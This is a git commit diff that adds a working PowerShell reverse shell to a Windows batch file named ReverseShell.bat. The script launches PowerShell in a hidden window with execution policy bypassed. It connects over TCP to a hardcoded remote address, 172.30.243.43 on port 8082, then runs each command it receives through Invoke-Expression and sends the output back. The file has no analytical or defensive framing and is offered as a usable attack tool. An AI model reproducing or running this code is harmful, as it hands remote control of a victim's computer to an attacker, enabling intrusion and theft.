72ae9638abf5f1da0b75b71276d3232ef20a13b3
Nnamdi Michael Okpala <koodu-platform@protonmail.com>
2024-03-30 15:41:28 +0000

    a

--- ReverseShell/Scripts/ReverseShell.bat
+++ ReverseShell/Scripts/ReverseShell.bat
@@ -1,4 +1,54 @@
 @echo off;
 REM Reverse Shell
-PowerShell -NoP -NonI -W Hidden -Exec Bypass -Command "& {Import-Module ../Modules/ReverseShell.psm1}"
-PowerShell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "& {}" REM <- Base64 encoded command within the quotes
+PowerShell -NoP -NonI -W Hidden -Exec Bypass -Command "& {
+using namespace System.Text;
+using namespace System.Net.Sockets;
+Function Start-ReverseShell {
+    param (
+        [string]$IPAddr = "127.0.0.1" ,
+        [string]$Port = "8080"
+    )
+
+    try {
+        
+        # Create a TCP client and connect to the remote host
+        $client = New-Object System.Net.Sockets.TCPClient($IPAddr, $Port)
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535 | ForEach-Object {0}
+        
+        # Send a connection confirmation
+        $sendbytes = ([text.encoding]::UTF8).GetBytes('Shell Connected: ' + (Get-Date).ToString() + "`n")
+        $stream.Write($sendbytes, 0, $sendbytes.Length)
+
+        # Enter a loop to receive commands from the remote host and execute them
+        while ($stream -and $stream.Read($bytes, 0, $bytes.Length) -ne 0) {
+
+            # Convert the received bytes to a string
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $bytes.Length)
+            try {
+                $sendback = Invoke-Expression -Command $data 2>&1 | Out-String;
+            }
+            catch {
+                $sendback = $_.Exception.Message;
+            }
+
+            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '>'
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte, 0, $sendbyte.Length)
+            $stream.Flush()
+        }
+        
+    }
+    catch {
+        Write-Host "Error: $_";
+    }
+    finally {
+        # Close the connection
+        if ($client) {
+            $client.Close();
+        }
+    }
+};
+
+Start-ReverseShell -IPAddr "172.30.243.43" -Port 8082;
+}" 
